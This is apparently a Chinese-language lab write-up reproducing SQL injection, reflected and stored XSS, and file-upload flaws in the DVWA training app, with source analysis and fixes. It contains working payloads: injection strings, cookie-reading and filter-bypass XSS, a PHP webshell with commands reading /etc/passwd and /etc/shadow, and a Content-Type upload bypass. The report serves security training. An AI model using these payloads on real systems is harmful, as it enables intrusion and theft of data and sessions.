# 2026-09-30 · DVWA 漏洞复现报告

> 数据来源：2026-09-26 – 2026-09-28 在本机 Ubuntu 靶场上的实测输出。
> 本日工作：把三个漏洞的复现数据整理成报告结构。

**靶场**：DVWA（Damn Vulnerable Web Application）｜ **环境**：本地虚拟机

---

## 一、环境与目标

| 项目 | 配置 |
|---|---|
| 虚拟机 | VMware 17 Pro，NAT 网络 |
| 操作系统 | Ubuntu 22.04 |
| Web 服务 | Apache 2.4.52 |
| 脚本语言 | PHP 8.1 |
| 数据库 | MariaDB 10.6.23 |
| 靶场地址 | `http://192.168.10.137/DVWA-master/` |

DVWA 内置四档安全等级（low / medium / high / impossible），等级值保存在客户端 Cookie 的 `security` 字段中，切换档位只改这一个 Cookie。

**目标**：在同一套靶场上复现 SQL 注入、XSS、文件上传三类漏洞，逐档位比对源码，验证每档防护手段的实际有效性，并给出修复建议。

### 复现清单

| 编号 | 漏洞 | 位置 | 复现档位 | 危害等级 |
|---|---|---|---|---|
| 1 | SQL 注入 | `vulnerabilities/sqli/` | low / medium / high | 高（敏感数据泄露） |
| 2 | 反射型 XSS | `vulnerabilities/xss_r/` | low / medium / high | 中（会话劫持） |
| 3 | 存储型 XSS | `vulnerabilities/xss_s/` | low | 中高（会话劫持、蠕虫传播） |
| 4 | 文件上传 | `vulnerabilities/upload/` | low / medium / high | **严重（命令执行）** |

---

## 二、SQL 注入

### 2.1 复现结果

位置：`vulnerabilities/sqli/`，User ID 输入框。

| 输入 | 返回 | 说明 |
|---|---|---|
| `1` | 1 条（admin） | 正常查询 |
| `1' OR '1'='1` | 5 条（全部用户） | 条件恒真，整表输出 |

### 2.2 三档实测对比

| 档位 | `1` | `1' OR '1'='1` | `1 OR 1=1` | `1' OR '1'='1' #` |
|---|---|---|---|---|
| low | 1 条 | **5 条** | 1 条 | 5 条 |
| medium | 1 条 | 0 条（报错） | **5 条** | 0 条 |
| high | 1 条 | 1 条 | — | **5 条** |

### 2.3 源码与成因

**low.php**

```php
$id = $_REQUEST[ 'id' ];                                                    // 第 5 行
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";  // 第 10 行
```

两行之间没有任何处理。输入被直接拼进 SQL，`1' OR '1'='1` 闭合引号后使条件恒成立，整张表被取出。

**medium.php**

```php
$id = $_POST[ 'id' ];                                              // 第 5 行：入口从 GET 改成 POST
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);  // 第 7 行：转义
$query = "SELECT ... FROM users WHERE user_id = $id;";             // 第 11 行：变量外的引号被去掉
```

转义对字符串是有效的 —— `1' OR '1'='1` 的单引号被转义后破坏语法，查询直接报错。但第 11 行去掉了包裹变量的引号，SQL 把它当成数字：`1 OR 1=1` 不含引号，转义函数无事可做，条件恒真成立。

**high.php**

```php
$id = $_SESSION[ 'id' ];                                       // 第 5 行：输入经 session 中转
$query = "SELECT ... WHERE user_id = '$id' LIMIT 1;";          // 第 10 行：追加 LIMIT 1
```

这一档改的是入口：输入先在 `session-input.php` 中写入 session，再由页面取出查询，中间没有做任何净化。`LIMIT 1` 把返回行数压到 1 条 —— 实测 `1' OR '1'='1` 确实只出 1 条；但只要用 `#` 把后面的 `LIMIT 1;` 注释掉（`1' OR '1'='1' #`），5 条全部返回。

### 2.4 结论

三档都没有使用参数化查询。改造点分别是入口方式、转义函数、以及输出行数限制，都属于补丁性质，注入依然成立。根治手段是预处理语句（`impossible.php` 改用 PDO）。

### 2.5 日志佐证

`/var/log/apache2/access.log`：

| 请求参数 | 状态码 | 响应字节 |
|---|---|---|
| `id=1` | 200 | 1811 |
| `id=1%27+OR+%271%27%3D%271` | 200 | 1870 |

单引号在 URL 中编码为 `%27`、空格为 `+`、等号为 `%3D`。注入请求只比正常请求多 59 字节，但**同一 payload 的响应长度严格可复现** —— 盲注正是基于这个长度差判断条件真假。

---

## 三、跨站脚本（XSS）

### 3.1 反射型

位置：`vulnerabilities/xss_r/`，Name 输入框。payload：

```
<script>alert(1)</script>
```

提交后弹窗，地址栏变为：

```
.../xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

payload 挂在 URL 中，服务端收到什么就原样吐回什么，不写入数据库，因此称为反射型。

**源码 low.php**

```php
header ("X-XSS-Protection: 0");                             // 第 1 行
if( array_key_exists( "name", $_GET ) && ... ) {
    $html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';     // 第 11 行
}
```

取值后直接拼进 HTML，中间没有任何处理。

**三档防护对比**

| 档位 | 防护写法 | 实测结果 |
|---|---|---|
| low | 无 | 弹窗 |
| medium | `str_replace( '<script>', '', ... )`（第 8 行） | 改传 `<img src=x onerror=alert(1)>` 照样弹 |
| high | `preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', ... )`（第 8 行） | 同样被 `<img src=x onerror=alert(1)>` 绕过 |

两档都是在**删除某些关键词**，属于黑名单思路。只要换一个不需要 `<script>` 标签的写法即可绕过。

**会话 Cookie 读取验证**：把 payload 换成 `<script>alert(document.cookie)</script>`，low 档弹出 `PHPSESSID=...; security=low`；用外部请求观察响应头，low 档的 `Set-Cookie` 不带 `HttpOnly`，impossible 档才带（`HttpOnly; SameSite=Strict`）。

### 3.2 存储型

位置：`vulnerabilities/xss_s/`，payload 写在 Message 框（注意 low 档 Name 框有 `maxlength="10"`，塞不下）。

提交后弹窗，**刷新页面仍然弹**，且地址栏是干净的 `.../xss_s/` —— 与反射型的区别就在这里：反射型要 URL 里带 payload 才弹，存储型只要打开这个页面就弹。

数据库中可以查到原始脚本：

```bash
mysql -u dvwa -pp@ssw0rd dvwa -e "SELECT * FROM guestbook;"
```

**源码 low.php**

```php
$message = trim( $_POST[ 'mtxMessage' ] );
$message = stripslashes( $message );
$message = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message);   // 第 12 行
$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
```

这里是有转义的 —— `mysqli_real_escape_string` 给单引号加反斜杠，SQL 侧安全（实测提交 `wyy'` 不报 SQL 错误，页面正常显示 `Name: wyy'`）。但**这个函数只处理 `'` `"` `\`，不处理 `<` 和 `>`** —— 在 SQL 的语境里尖括号没有特殊含义，它不需要管。

问题出在显示环节。页面 HTML 原文：

```html
<div id="guestbook_comments">Name: ah<br />Message: <script>alert(document.cookie)</script><br /></div>
```

存进去什么样，显示出来就什么样，`<script>` 一个字符没动。显示逻辑在公共文件 `dvwa/includes/dvwaPage.inc.php` 的 `dvwaGuestbook()` 中，**只有 impossible 档在输出时做了 `htmlspecialchars`**。

同一份输入去了两个地方：写入数据库那一步被防住了，输出到网页那一步没有。

### 3.3 三个模块的转义差异

| 文件 | 输入流向 | 处理情况 |
|---|---|---|
| `sqli/low.php` | 只进 SQL | 未处理，SQL 注入成立 |
| `xss_r/low.php` | 只进 HTML | 未处理，XSS 成立 |
| `xss_s/low.php` | 同时进 SQL 和 HTML | SQL 侧转义了，HTML 侧未处理 |

**结论**：转义与编码必须按数据要去的地方选择 —— 进 SQL 用参数化查询，进 HTML 用实体编码。在输入端做黑名单会被绕过，只有输出端编码是有效修复。

---

## 四、文件上传

### 4.1 low 档：上传即执行

上传一个内容为以下代码的 PHP 文件：

```
<?php system($_GET["cmd"]); ?>
```

页面回显：

```
../../hackable/uploads/shell.php succesfully uploaded!
```

访问 `.../hackable/uploads/shell.php?cmd=id`：

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

拿到命令执行权限（getshell）。`?cmd=` 后面写什么，`system()` 就把那串当命令执行。

**形成条件（三个同时成立才危险）**

1. 服务端没有校验文件后缀与真实类型
2. 上传目录在网站根目录内，可以被浏览器直接访问
3. 该目录下的脚本会被 Web 服务解析执行

Apache 判断的依据是**后缀 `.php`**，与文件内容、上传者身份都无关。

### 4.2 执行身份与权限边界

命令以 `www-data`（UID 33）身份执行，这是 Apache 的工作账号，不是 root。该账号的登录 shell 为 `/usr/sbin/nologin`，属于服务账号，本身不能登录系统。

| 目标 | 权限（实测） | 结果 |
|---|---|---|
| `/etc/passwd` | `-rw-r--r--`（644） | 可读，拿到全部账号列表 |
| `/etc/shadow` | `-rw-r-----`（640 root:shadow） | 读不到 |

```bash
?cmd=ls%20-l%20/etc/passwd%20/etc/shadow
-rw-r--r-- 1 root root   2983 Sep 26 13:49 /etc/passwd
-rw-r----- 1 root shadow 1515 Sep 26 13:49 /etc/shadow
```

`cat /etc/shadow` 并非没有执行 —— 报错信息走的是 **stderr**，而 `system()` 只把 **stdout** 打到网页上，所以页面一片空白（实测响应体 0 字节）。加上 `2>&1`（把 stderr 重定向到 stdout）才看得到：

```bash
?cmd=cat%20/etc/shadow%202%3E%261
cat: /etc/shadow: Permission denied
```

顺带记录一个易错点：`>file 2>&1` 的书写顺序不能颠倒 —— 重定向从左到右依次执行，`2>&1` 复制的是"执行到它那一刻 fd 1 指向的位置"，写反了错误信息会留在终端而不进文件。

**结论**：拿到 webshell ≠ 拿到 root。上传文件的属主会是 `www-data www-data`，且位于上传目录中 —— 这两个特征加上最新的修改时间，是应急排查 webshell 的常用筛查条件。

### 4.3 medium 档：改一个字段即可绕过

**源码 `vulnerabilities/upload/source/medium.php`**

```php
$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];                            // 第 10 行
$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&   // 第 14 行
    ( $uploaded_size < 100000 ) ) {                                          // 第 15 行
```

`$_FILES['uploaded']['type']` 的值来自上传报文里客户端自填的 `Content-Type` 字段，浏览器按文件后缀自动填写。也就是说，这一档校验的是**客户端自报的类型**，不是文件的真实内容。

| 操作 | 结果 |
|---|---|
| 页面上直接上传 `.php` | 被拒 |
| 请求体中把该字段改为 `image/jpeg`，其余不变 | 上传成功，`?cmd=id` 仍返回 `uid=33(www-data)` |

**复现方式**：页面直接上传必然失败（`.php` 自报的当然不是图片类型），需要在浏览器控制台手工构造 `multipart/form-data` 请求，指定该字段的值。payload 内容与文件名均不变，**唯一改动是 `Content-Type` 这一处**。

自报值可以被任意修改，这道校验等于从内部打开。

### 4.4 high 档：后缀白名单 + 内容校验

**源码 `vulnerabilities/upload/source/high.php`**

```php
$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);  // 第 10 行
$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&   // 第 15 行
    ( $uploaded_size < 100000 ) &&                                                                                                 // 第 16 行
    getimagesize( $uploaded_tmp ) ) {                                                                                              // 第 17 行
```

`getimagesize()` 会读取文件头里的图片宽高，读不出来就返回 false —— 这是对**文件真实内容**的校验，与 medium 档有本质区别。

| 上传对象 | 第 15 行（后缀） | 第 17 行（内容） | 回显 |
|---|---|---|---|
| `shell.php` | 不在白名单，拦截 | — | `Your image was not uploaded. We can only accept JPEG or PNG images.` |
| `shell.jpg`（内容仍是 PHP） | 通过 | 读不出图片尺寸，拦截 | 与上一行**完全相同** |
| `dvwa_email.png`（真实图片） | 通过 | 通过 | `succesfully uploaded!` |

两次失败的回显由同一个 `else` 分支输出（第 31 行），页面上无法区分是被哪一条拦下的 —— 差分测试在这里失效，必须读源码才能定位校验点。

### 4.5 四档对比

| 档位 | 校验手段 | 实测结果 | 绕过方式 |
|---|---|---|---|
| low | 无 | `.php` 上传后直接执行 | — |
| medium | 客户端自报的 `Content-Type`（第 10、14–15 行） | 改报 `image/jpeg` 即通过 | 修改请求 |
| high | 后缀白名单 + `getimagesize()`（第 10、15–17 行） | `.php` 与 `.jpg` 均被拒 | 需图片马配合文件包含 |
| impossible | 随机重命名 + GD 库重编码 | 落地文件名与后缀均不可控，无法预测访问路径 | — |

**修复要点**：用白名单而不是黑名单校验后缀；用 `getimagesize()` 校验真实类型；上传后重命名为随机字符串；上传目录禁止解析 PHP，或移到网站根目录之外。

### 4.6 清理痕迹

```bash
sudo rm -f /var/www/html/DVWA-master/hackable/uploads/shell.php
ls -l /var/www/html/DVWA-master/hackable/uploads/
```

删除后访问原 URL 返回 `404 Not Found`，目录中仅剩靶场自带的 `dvwa_email.png`。

上传文件的属主为 `www-data www-data`（由网站进程写入），配合最新的修改时间，这两点叠加是应急排查 webshell 的常用筛查条件。

---

## 五、修复建议汇总

| 漏洞 | 根因 | 修复位置与做法 |
|---|---|---|
| SQL 注入 | 输入被直接拼进 SQL 语句 | 改用参数化查询（PDO 预处理），不再拼接字符串 |
| 反射型 / 存储型 XSS | 输出到 HTML 时未编码 | 输出端统一做实体编码（`htmlspecialchars($s, ENT_QUOTES, 'UTF-8')`）；黑名单过滤无效；会话 Cookie 补 `HttpOnly` |
| 文件上传 | 只校验客户端自报值 / 校验不完整 | 白名单后缀 + `getimagesize()` 校验真实类型 + 上传后重命名 + 上传目录禁止脚本解析 |

三类漏洞有一个共同点：**防护都要做在数据实际被使用的那一环**。进 SQL 就在 SQL 层参数化，进 HTML 就在输出时编码，落到磁盘就在服务端校验真实类型 —— 在入口处做关键词过滤属于补丁，换个写法即可绕过。

## 六、复现方法说明

漏洞样本（含 `system()` 的 PHP 文件）在测试主机上无法落地：杀毒软件按文件内容特征识别并清除，与文件名、存放目录无关。因此样本只在靶场虚拟机内部创建，上传时通过标准输入传递、不写入本地磁盘，验证完成后立即删除并在报告中保留删除记录。

---

**报告完毕。以上结论均基于本机靶场的实际复现结果与对应源码行，未复现的内容不作推断。**

